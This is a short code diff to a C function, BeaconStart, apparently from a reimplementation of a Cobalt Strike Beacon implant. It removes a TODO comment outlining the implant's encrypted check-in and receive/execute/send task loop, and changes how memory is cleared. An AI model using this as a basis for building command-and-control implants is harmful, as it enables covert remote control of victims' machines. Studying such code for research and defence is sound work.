@@ -112,39 +112,6 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 
 		Ins.Module[3] = Ins.api.LoadLibraryA( CPTR( Str ) );
 
-		/*-
-		 *
-		 * TODO
-		 *
-		 * 1. Initialize RSA with the DER encoded key
-		 * extracted from Cobalt Strike.
-		 *
-		 * 2. Initialize AES with a random key from
-		 * CryptGenRandom().
-		 *
-		 * 3. Initialize MAC with a random key from
-		 * CryptGenRandom().
-		 *
-		 * 4. Create check-in packet containing the
-		 * info about the Beacon.
-		 *
-		 * 5. Send the packet. If it responds with a
-		 * SUCCESS response, start the IO loop with
-		 * a recv/execute-task/send loop. 
-		 * 
-		 * 6. In pointer arrays, create C defs for
-		 * the various index's.
-		 *
-		 * Functions needed:
-		 *
-		 * 	1. CryptAesEnc()
-		 * 	2. CryptAesDec()
-		 * 	3. CryptRsaEnc()
-		 * 	4. CryptMacHash()
-		 *	5. CryptInit()
-		 *
-		-*/
-
 		if ( Ins.api.CryptDecodeObjectEx( 
 				X509_ASN_ENCODING, 
 				X509_PUBLIC_KEY_INFO, 
@@ -172,7 +139,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 			Ins.api.FreeLibrary( Ins.Module[0] );
 	};
 
-	RtlSecureZeroMemory( &Ins, sizeof( Ins ) );
+	__builtin_memset( &Ins, 0, sizeof( Ins ) );
 
 	return;
 };
